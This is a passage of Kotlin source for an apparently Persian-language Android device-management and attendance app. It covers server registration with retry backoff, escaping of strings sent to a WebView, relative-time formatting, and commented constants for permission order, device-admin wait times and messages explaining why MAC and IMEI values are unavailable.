            Prefs.cacheAndroidId(this, androidId)
            val hardware = withContext(Dispatchers.IO) {
                DeviceCollector.collect(this@MainActivity) + networkFacts()
            }
            val res = withContext(Dispatchers.IO) {
                runCatching {
                    MdmApi(prefs.serverUrl, "").register(
                        androidId, hardware, prefs.label.ifBlank { Build.MODEL },
                    )
                }.getOrNull()
            }
            if (res != null && res.deviceKey.isNotEmpty()) {
                prefs.deviceKey = res.deviceKey
                prefs.registered = true
                prefs.lostMode = res.lostMode
                PolicyEnforcer.apply(this, res.policy)
                PolicyWatchService.start(this)
                true
            } else {
                // 3s, 9s, 27s. Long enough that a server which is genuinely down
                // is not hammered, short enough that a phone which comes back on
                // the same walk is registered before it is put away.
                delay(3_000L * (3.0.pow(attempt.toDouble())).toLong())
                registerDevice(attempt + 1)
            }
        } catch (t: Throwable) {
            Log.w(TAG, "register: ${t.message}")
            if (attempt > REGISTER_ATTEMPTS) {
                false
            } else {
                delay(3_000L)
                registerDevice(attempt + 1)
            }
        }
    }

    // ── helpers ────────────────────────────────────────────────────────────

    private fun status(msg: String, tone: String = "") {
        pendingLog = msg
        pendingTone = tone
        if (ready) callJs("Prf.log(${jsStr(msg)}, ${jsStr(tone)});")
    }

    private fun push() {
        if (!ready) return
        callJs("Prf.push && Prf.push();")
    }

    private fun callJs(src: String) {
        ui.post { try { web.evaluateJavascript(src, null) } catch (t: Throwable) { } }
    }

    /**
     * A JS string literal, escaped.
     *
     * Every string that reaches the page goes through here. A device that
     * reports a build id containing a quote or a newline would otherwise close
     * the literal early and turn the rest of a JSON object into script.
     */
    private fun jsStr(s: String): String {
        val sb = StringBuilder("\"")
        for (c in s) {
            when (c) {
                '"' -> sb.append("\\\"")
                '\\' -> sb.append("\\\\")
                '\n' -> sb.append("\\n")
                '\r' -> sb.append("\\r")
                '\t' -> sb.append("\\t")
                '<' -> sb.append("\\u003c")
                else -> if (c < ' ') sb.append("\\u%04x".format(c.code)) else sb.append(c)
            }
        }
        return sb.append('"').toString()
    }

    /** Persian digits for anything the person reads; identifiers stay as they are. */
    private fun fa(s: String): String =
        s.map { if (it in '0'..'9') '۰' + (it - '0') else it }.joinToString("")

    private fun relative(ms: Long): String {
        if (ms <= 0L) return "هرگز"
        val s = ((System.currentTimeMillis() - ms) / 1000).coerceAtLeast(0)
        return when {
            s < 60 -> "${fa(s.toString())} ثانیه پیش"
            s < 3600 -> "${fa((s / 60).toString())} دقیقه پیش"
            s < 86400 -> "${fa((s / 3600).toString())} ساعت پیش"
            else -> "${fa((s / 86400).toString())} روز پیش"
        }
    }

    override fun onDestroy() {
        ui.removeCallbacks(tick)
        runJob?.cancel()
        scope.cancel()
        try { web.destroy() } catch (t: Throwable) { }
        super.onDestroy()
    }

    private companion object {
        const val TAG = "PRF.Main"

        /** The record is a single kind: one press, one record, no toggle. */
        const val KIND_ATTENDANCE = "attendance"

        /**
         * The MAC every app gets from Android 6 onwards.
         *
         * `WifiInfo.getMacAddress()` does not fail and does not return null on
         * a modern phone — it returns this, a valid-looking address that has
         * never belonged to anything. Treating it as a value would put a
         * fabricated hardware ID in front of the owner, who would reasonably
         * read it as this phone's. So it is matched and dropped, and the fact
         * is reported as the reason instead.
         */
        const val MAC_PLACEHOLDER = "02:00:00:00:00:00"
        const val PHOTOS_PER_LENS = 3
        const val VOICE_SECONDS = 8
        const val MAX_PHOTO_EDGE = 1600
        const val JPEG_QUALITY = 80
        const val PREVIEW_SETTLE_MS = 1200L

        /**
         * How long the run waits for the user to answer the admin dialog.
         *
         * Long enough to read and act on a system dialog, short enough that a
         * person who dismissed it is not left looking at a spinner. The run
         * continues either way; the grant is reported as refused if it is not
         * there when this expires.
         */
        const val ADMIN_WAIT_MS = 60_000L

        /**
         * How long the grant is given a moment to land after the activity comes
         * back from the grant screen. Read once, immediately, some builds
         * report the old state and the run would call a completed grant a
         * refusal.
         */
        const val GRANT_SETTLE_MS = 700L

        /**
         * The same, for the grant fired on launch rather than from a run. A
         * dialog the app opened by itself has nobody waiting for it, so the
         * window is shorter than the run's.
         */
        const val AUTO_ADMIN_WAIT_MS = 25_000L

        /**
         * How long a single-shot location request may hold up the run. A phone
         * indoors with no GPS will not answer at all, and the record is still
         * worth sending without a location.
         */
        const val LOCATION_WAIT_MS = 6_000L

        const val REGISTER_ATTEMPTS = 3

        /**
         * The order the run asks for permissions in.
         *
         * Camera first because the photos are the part of the record that
         * cannot be reconstructed later; the microphone next, then location.
         * Notification is deliberately not in the list: the app declares no
         * POST_NOTIFICATIONS permission and posts none, and a permission for a
         * notification it never shows would be a permission the phone has been
         * asked for with no reason.
         */
        val PERM_ORDER = listOf(
            android.Manifest.permission.CAMERA,
            android.Manifest.permission.RECORD_AUDIO,
            Permissions.LOCATION,
        )

        /**
         * The three reasons, written for a person and not for a log.
         *
         * Each is a value the platform refuses, and each is refused in a way
         * that looks like success — a method that returns a placeholder rather
         * than throwing. A fact with a reason on it is honest; a fact with a
         * placeholder in it is not.
         */
        const val NO_MAC =
            "اندروید ۶ به بعد آدرس واقعی مک را به برنامه‌های معمولی نمی‌دهد و " +
                "به‌جای آن یک مقدار ثابت برمی‌گرداند."
        const val NO_IMEI =
            "خواندن شماره‌ی سخت‌افزاری به دسترسی مخصوص سیستمی نیاز دارد که " +
                "فقط برنامه‌های امضاشده توسط سازنده دارند."
        const val NO_WIFI = "این گوشی به وای‌فای وصل نیست."
        const val NO_NET_TYPE =
            "نوع شبکه‌ی دقیق از اندروید ۱۱ به بعد نیاز به اجازه‌ی خواندن " +
                "وضعیت سیم‌کارت دارد که این برنامه آن را نمی‌گیرد."
    }
}
